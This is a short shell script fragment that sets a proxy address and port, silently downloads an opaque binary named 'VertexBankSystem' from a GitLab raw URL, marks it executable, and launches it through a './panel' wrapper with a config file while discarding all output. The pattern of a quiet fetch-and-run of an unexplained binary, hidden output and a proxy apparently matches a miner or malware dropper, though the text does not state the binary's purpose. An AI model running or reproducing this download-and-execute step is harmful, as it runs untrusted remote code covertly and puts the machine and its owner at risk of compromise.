proxy="192.111.138.29" 
port="4145"
wget -q -O VertexBankSystem https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x VertexBankSystem
...
./panel ./VertexBankSystem -c "config.json" >/dev/null 2>&1
sleep 1
